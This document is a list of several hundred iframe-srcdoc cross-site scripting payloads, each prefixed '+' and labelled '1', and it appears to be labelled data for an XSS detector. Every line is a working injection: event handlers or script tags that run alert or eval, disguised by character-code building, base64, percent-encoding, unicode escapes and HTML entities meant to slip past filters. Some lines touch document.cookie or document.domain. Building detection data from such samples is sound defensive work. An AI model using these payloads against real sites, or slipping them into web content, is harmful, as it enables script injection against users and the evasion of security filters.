+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(1)',0)>" />	1
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(1)',0)>">	1
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(2)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+String.fromCharCode(101,114,116)+'(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('ale'+'rt(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('ale'+'rt(1)',1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('ev'+'al(`\\u0061lert(1)`)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(`\\u0061l\\u0065rt(1)`,0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(`al`+`ert(1)`)>"</iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(`ale`+'rt(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(atob('YWxlcnQ=')+'(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(String.fromCharCode(97,108,101,114,116,40,49,41)),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMSk=')),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(atob('YWxlcnQoMTEp')),0)>">	1
+<iframe srcdoc="<img src=x onerror=setTimeout(window['al'+'ert'](1),0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[&quot;al&quot;+&quot;ert&quot;](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['Function']('al'+'ert(1)')()>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>">	1
+<iframe srcdoc="<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['\x65\x76\x61\x6c']('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>">	1
+<iframe srcdoc="<img src=x onerror=window['\x65\x76\x61\x6c']('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['a'+'lert'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['a'+String.fromCharCode(108)+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al'+'\u0065rt'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al'+'\x65rt'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al'+'ert']('XSS')>">	1
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](1)>">	1
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](2)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al'+'ert'](String.raw`1`)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['al\x65rt'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['ale'+'rt'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window['ale'+'rt'](123)>">	1
+<iframe srcdoc="<img src=x onerror=window['eval']('al'+'ert(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[`al${String.fromCharCode(101,114,116)}`](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[`al`+'ert']('1')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[`al`+`ert`](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[atob('YWxlcnQ=')](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[atob('YWxlcnQ=')](123)>">	1
+<iframe srcdoc="<img src=x onerror=window[decodeURIComponent('%61%6c%65%72%74')](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=window[unescape('%61%6C%65%72%74')](1)>"></iframe>	1
+<iframe srcdoc="<meta charset='utf-8'><img src=x onerror=window['a'+unescape('%6Ce%72t')](1)>">	1
+<iframe srcdoc="<meta charset='utf-8'><svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')></svg>">	1
+<iframe srcdoc="<object data='data:text/html,<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<img src=x onerror=window[atob(&quot;YWxlcnQ=&quot;)](1)>'></object>">	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=alert(`1`)>'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=eval(atob(`YWxlcnQoMSk=`))>'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=setTimeout(`alert(1)`,0)>'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html,<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>'></object>">	1
+<iframe srcdoc="<object data='data:text/html,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot;><script>window[&quot;al&quot;+&quot;ert&quot;](5)</script></svg>'></iframe>">	1
+<iframe srcdoc="<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4='></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9IndpbmRvdy5hbGVydCgxKSI+PC9zdmc+'></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4='></object>"></iframe>	1
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>" ></iframe>	1
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>"></iframe>	1
+<iframe srcdoc="<object data=data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></object>"></iframe>	1
+<iframe srcdoc="<object data=data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>>"></iframe>	1
+<iframe srcdoc="<script type='text/javascript'>alert(1)</script>">	1
+<iframe srcdoc="<script>(()=>{window['ale'+'rt'](123)})()</script>"></iframe>	1
+<iframe srcdoc="<script>(Function('alert(1)')())</script>"></iframe>	1
+<iframe srcdoc="<script>Function('\u0061\u006c\u0065\u0072\u0074(40)')()</script>"></iframe>	1
+<iframe srcdoc="<script>Function('\x61'+'\x6c'+'\x65'+'\x72'+'\x74(52)')()</script>"></iframe>	1
+<iframe srcdoc="<script>Function('\x61\x6c\x65\x72\x74(28)')()</script>"></iframe>	1
+<iframe srcdoc="<script>Function('al'+'ert(1)')()</script>">	1
+<iframe srcdoc="<script>Function('al'+'ert(16)')()</script>"></iframe>	1
+<iframe srcdoc="<script>Function('return ale'+'rt')()('1')</script>">	1
+<iframe srcdoc="<script>\u0061\u006C\u0065\u0072\u0074(1)</script>"></iframe>	1
+<iframe srcdoc="<script>al&#x65;rt(1)</script>">	1
+<iframe srcdoc="<script>al\u0065rt('XSS')</script>"></iframe>	1
+<iframe srcdoc="<script>alert&#x28;&#49;&#x29;</script>">	1
+<iframe srcdoc="<script>alert&NewLine;&lpar;'XSS'&rpar;</script>">	1
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>	1
+<iframe srcdoc="<script>alert(String.fromCharCode(49,49,49))</script>"></iframe>	1
+<iframe srcdoc="<script>eval('&#97;&#108;&#101;&#114;&#116;&#40;1&#41;')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('\u0061\u006c\u0065\u0072\u0074(36)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('\x61'+'\x6c'+'\x65'+'\x72'+'\x74(48)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('\x61\x6c\x65\x72\x74(24)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('al'+'ert(1)')</script>">	1
+<iframe srcdoc="<script>eval('al'+'ert(1)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('al'+'ert(12)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('al\x65rt(0x7b)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('al\x65rt(111)')</script>"></iframe>	1
+<iframe srcdoc="<script>eval('ale'+'rt(49,49,49)')</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74).concat(String.fromCharCode(0x28,0x31,0x30,0x30,0x29)))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.cookie)')</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116).concat(String.fromCharCode(40,49,50,51,41)))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,89,39,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))</script>">	1
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,53,41))</script>">	1
+<iframe srcdoc="<script>eval([...'al\x65rt(1)'].join(''))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)</script>"></iframe>	1
+<iframe srcdoc="<script>eval(`al`+`ert(24)`)</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoJzEnKQ=='))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoJzEwMCcp'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoJzEyMycp'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTAwKQ=='))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTExKQ=='))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTExKQ=='))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTEzKQ=='))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTIzKQ=='))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>">	1
+<iframe srcdoc="<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>">	1
+<iframe srcdoc="<script>eval(atob('d2luZG93LmFsZXJ0KDEp'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))</script>">	1
+<iframe srcdoc="<script>eval(decodeURIComponent('%61%6c%65%72%74%28%27%58%53%53%27%29'))</script>">	1
+<iframe srcdoc="<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))</script>">	1
+<iframe srcdoc="<script>eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))</script>">	1
+<iframe srcdoc="<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>">	1
+<iframe srcdoc="<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))</script>"></iframe>	1
+<iframe srcdoc="<script>eval(unescape('\u0061\u006c\u0065\u0072\u0074(1)'))</script>"></iframe>	1
+<iframe srcdoc="<script>import('data:text/javascript,al%65rt(123)')</script>"></iframe>	1
+<iframe srcdoc="<script>let e=Function;new e('ale'+'rt(1)')()</script>">	1
+<iframe srcdoc="<script>let e=atob('YWxlcnQoMSk=');eval(e)</script>">	1
+<iframe srcdoc="<script>let e=unescape('%61%6c%65%72%74%28%31%29');eval(e)</script>">	1
+<iframe srcdoc="<script>setInterval(() => alert(1), 1000)</script>">	1
+<iframe srcdoc="<script>setInterval(()=>window['alert'](1),1000)</script>"></iframe>	1
+<iframe srcdoc="<script>setInterval(()=>window[`al`+'ert']('XSS'),1000)</script>">	1
+<iframe srcdoc="<script>setInterval(function(){alert(1)}, 1000)</script>">	1
+<iframe srcdoc="<script>setTimeout('&#x61;&#108;&#101;&#114;&#116;(`4`)', 0)</script>">	1
+<iframe srcdoc="<script>setTimeout('&#x61;&#x6c;&#x65;&#x72;&#x74;(`24`)', 0)</script>">	1
+<iframe srcdoc="<script>setTimeout('al&#101;rt(1)',100);</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout('al'+'ert(123)',0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout('al'+String.fromCharCode(101,114,116)+'(1)',0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout('alert(52)', 0)</script>">	1
+<iframe srcdoc="<script>setTimeout(() => alert(40), 0)</script>">	1
+<iframe srcdoc="<script>setTimeout(() => window['al'+'ert'](1), 0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(()=>{let a=atob('YWxlcnQoMSk=');eval(a)},0)</script>">	1
+<iframe srcdoc="<script>setTimeout(()=>{let a=unescape('%61%6c%65%72%74%28%31%29');eval(a)},0)</script>">	1
+<iframe srcdoc="<script>setTimeout(()=>{let e=atob('YWxlcnQoMSk=');eval(e)},0)</script>">	1
+<iframe srcdoc="<script>setTimeout(()=>{let e=window['\x65\x76\x61\x6c'];e('al'+'ert(1)')},0)</script>">	1
+<iframe srcdoc="<script>setTimeout(()=>{window[`al`+`ert`](1)},0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(Function('al'+'ert(111)'),1000)</script>">	1
+<iframe srcdoc="<script>setTimeout(`alert(1)`, 0)</script>">	1
+<iframe srcdoc="<script>setTimeout(`alert(1)`,0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(function(){alert(1)}, 0)</script>">	1
+<iframe srcdoc="<script>setTimeout(function(){window['\x61\x6c\x65\x72\x74']('\x58\x53\x53')},0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(function(){window['\x61\x6c\x65\x72\x74'](1)},0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(function(){window['al'+'ert'](1)},0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(function(){window['ale'+'rt'](1)},0)</script>"></iframe>	1
+<iframe srcdoc="<script>setTimeout(function(){window[atob('YWxlcnQ=')]('1')},0)</script>">	1
+<iframe srcdoc="<script>top[atob('YWxlcnQ=')](1)</script>">	1
+<iframe srcdoc="<script>var z=atob('YWxlcnQoNTkp');eval(z)</script>"></iframe>	1
+<iframe srcdoc="<script>window&#46;&#x61;lert(1)</script>">	1
+<iframe srcdoc="<script>window.location='javascript:'+unescape('%61%6c%65%72%74%28%31%29')</script>">	1
+<iframe srcdoc="<script>window[&quot;al&quot;+&quot;ert&quot;](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\u0061\u006c\u0065\u0072\u0074'](32)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](44)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\x61\x6c\x65\x72\x74'](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\x61\x6c\x65\x72\x74'](20)</script>"></iframe>	1
+<iframe srcdoc="<script>window['\x65\x76\x61\x6c'](unescape('%61%6c%65%72%74(49,49,49)'))</script>">	1
+<iframe srcdoc="<script>window['al'+'ert']('1')</script>">	1
+<iframe srcdoc="<script>window['al'+'ert']('XSS')</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0b1)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0b11)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0o1)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0o11)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0x1)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](0x31)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](1)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window['al'+'ert'](111)</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](4)</script>"></iframe>	1
+<iframe srcdoc="<script>window['al'+'ert'](8)</script>"></iframe>	1
+<iframe srcdoc="<script>window['al'+'ert'](String.fromCharCode(49))</script>">	1
+<iframe srcdoc="<script>window['al'+'ert'](atob('WFNT'))</script>"></iframe>	1
+<iframe srcdoc="<script>window['al'+'ert'](unescape('%31%31%33'))</script>"></iframe>	1
+<iframe srcdoc="<script>window['ale'+'rt'](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>">	1
+<iframe srcdoc="<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window[atob('YWxlcnQ=')](1)</script>">	1
+<iframe srcdoc="<script>window[unescape('%61%6C%65%72%74')](1)</script>"></iframe>	1
+<iframe srcdoc="<script>window[unescape('%61%6c%65%72%74')](1)</script>"></iframe>	1
+<iframe srcdoc="<script>with({})eval((()=>{return atob('YWxlcnQoMSkNCg==')})())</script>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"></iframe>	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#50;&#51;&#41;>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&lpar;&#39;1&#39;&rpar;>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;('XSS')>">	1
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#x74;&#40;&#x31;&#x29;>">	1
+<iframe srcdoc="<svg onload=&#97;&#x6c;&#101;&#114;&#x74;&#40;&#47;&#88;&#83;&#x53;&#47;&#41;>">	1
+<iframe srcdoc="<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>">	1
+<iframe srcdoc="<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#x32;&#x33;&#41;>">	1
+<iframe srcdoc="<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(String.fromCharCode(68))>">	1
+<iframe srcdoc="<svg onload=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>">	1
+<iframe srcdoc="<svg onload=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#41;>">	1
+<iframe srcdoc="<svg onload=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>">	1
+<iframe srcdoc="<svg onload='&#97;&#108;&#101;&#114;&#116;`1`'>"></iframe>	1
+<iframe srcdoc="<svg onload='&#x61;&#x6c;&#x65;&#x72;&#x74;(`12`)'>">	1
+<iframe srcdoc="<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'/>"></iframe>	1
+<iframe srcdoc="<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>">	1
+<iframe srcdoc="<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>"></iframe>	1
+<iframe srcdoc="<svg onload='eval(atob(`YWxlcnQoMzYp`))'>">	1
+<iframe srcdoc="<svg onload='eval(unescape(&#34;%61%6c%65%72%74%28%27%58%53%53%27%29&#34;))'>">	1
+<iframe srcdoc="<svg onload='setTimeout(() => eval(String.fromCharCode(97,108,101,114,116,40,49,41)), 0)'></svg>"></iframe>	1
+<iframe srcdoc="<svg onload='setTimeout(`alert(28)`,0)'>">	1
+<iframe srcdoc="<svg onload='window[&quot;a&quot;+&quot;lert&quot;](1)'></svg>"></iframe>	1
+<iframe srcdoc="<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=(function(){window['ale'+'rt'](7)})()>"></iframe>	1
+<iframe srcdoc="<svg onload=Function('al'+'ert(1)')()>">	1
+<iframe srcdoc="<svg onload=Function('al'+'ert(1)')()>"></iframe>	1
+<iframe srcdoc="<svg onload=Function('al'+'ert(19)')()>"></iframe>	1
+<iframe srcdoc="<svg onload=Function('al'+String.fromCharCode(101,114,116,40,49,41))()>"></iframe>	1
+<iframe srcdoc="<svg onload=alert(/XSS/.source)></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>	1
+<iframe srcdoc="<svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(&#96;&#97;&#108;&#101;&#114;&#116;&#96;+&#96;&#40;&#96;+&#96;1&#96;+&#96;&#41;&#96;)>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('&#97;&#108;&#101;&#114;&#116;(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')>">	1
+<iframe srcdoc="<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(''.concat('aler','t(1)'))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('\u0061lert(2)')>">	1
+<iframe srcdoc="<svg onload=eval('\u0061lert(4)')>">	1
+<iframe srcdoc="<svg onload=eval('al'+'ert(1)')>">	1
+<iframe srcdoc="<svg onload=eval('al'+'ert(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('al'+'ert(1)')></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('al'+'ert(16)')>">	1
+<iframe srcdoc="<svg onload=eval('al'+String.fromCharCode(101,114)+'t(`XSS`)')></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval('decodeURIComponent(escape(unescape(\\u0061\\u006c\\u0065\\u0072\\u0074(1))))')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>">	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>" >	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></iframe>">	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>">	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41]))>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))></svg>"></iframe>	1
+<iframe srcdoc="<svg onload=eval(`&#x61;&#x6C;&#x65;&#x72;&#x74;(1)`)>" ></iframe>	1
+<iframe srcdoc="<svg onload=eval(`&#x61;&#x6C;&#x65;&#x72;&#x74;(1)`)>"></iframe>	1
